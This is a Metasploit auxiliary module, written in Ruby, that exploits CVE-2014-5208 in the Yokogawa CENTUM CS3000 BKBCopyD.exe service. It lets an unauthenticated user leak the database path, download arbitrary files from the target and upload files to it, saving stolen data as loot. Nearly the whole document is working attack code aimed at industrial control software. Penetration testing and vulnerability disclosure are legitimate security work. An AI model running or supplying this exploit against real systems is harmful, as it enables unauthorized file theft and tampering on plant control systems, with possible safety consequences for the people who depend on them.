##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Yokogawa BKBCopyD.exe Client',
      'Description'    => %q{
        This module allows an unauthenticated user to interact with the Yokogawa
        CENTUM CS3000 BKBCopyD.exe service through the PMODE, RETR and STOR
        operations.
      },
      'Author'         =>
        [ 'Unknown' ],
      'References'     =>
        [
          [ 'CVE', '2014-5208' ],
          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2014/08/09/r7-2014-10-disclosure-yokogawa-centum-cs3000-bkbcopydexe-file-system-access']
        ],
      'Actions'     =>
        [
          ['PMODE', { 'Description' => 'Leak the current database' }],
          ['RETR',  { 'Description' => 'Retrieve remote file' }],
          ['STOR',  { 'Description' => 'Store remote file' }]
        ],
      'DisclosureDate' => 'Aug 9 2014'))

    register_options(
      [
        Opt::RPORT(20111),
        OptString.new('RPATH', [ false, 'The Remote Path (required to RETR and STOR)', "" ]),
        OptPath.new('LPATH', [ false, 'The Local Path (required to STOR)' ])
      ])
  end

  def srvport
    @srvport
  end

  def run
    exploit
  end

  def exploit
    @srvport = rand(1024..65535)
    print_status("#{@srvport}")
    # We make the client connection before giving control to the TCP Server
    # in order to release the src port, so the server can start correctly

    case action.name
    when 'PMODE'
      print_status("Sending PMODE packet...")
      data = "PMODE MR_DBPATH\n"
      res = send_pkt(data)
      if res and res =~ /^210/
        print_good("Success: #{res}")
      else
        print_error("Failed...")
      end
      return
    when 'RETR'
      data = "RETR #{datastore['RPATH']}\n"
      print_status("Sending RETR packet...")
      res = send_pkt(data)
      return unless res and res =~ /^150/
    when 'STOR'
      data = "STOR #{datastore['RPATH']}\n"
      print_status("Sending STOR packet...")
      res = send_pkt(data)
      return unless res and res =~ /^150/
    else
      print_error("Incorrect action")
      return
    end

    super # TCPServer :)
  end

  def send_pkt(data)
    connect(true, {'CPORT' => @srvport})
    sock.put(data)
    data = sock.get_once
    disconnect

    return data
  end

  def on_client_connect(c)
    if action.name == 'STOR'
      contents = ""
      File.new(datastore['LPATH'], "rb") { |f| contents = f.read }
      print_status("#{c.peerhost} - Sending data...")
      c.put(contents)
      self.service.close
      self.service.stop
    end
  end

  def on_client_data(c)
    print_status("#{c.peerhost} - Getting data...")
    data = c.get_once
    return unless data
    if @store_path.blank?
      @store_path = store_loot("yokogawa.cs3000.file", "application/octet-stream", rhost, data, datastore['PATH'])
      print_good("#{@store_path} saved!")
    else
      File.open(@store_path, "ab") { |f| f.write(data) }
      print_good("More data on #{@store_path}")
    end
  end

  def on_client_close(c)
    stop_service
  end
end

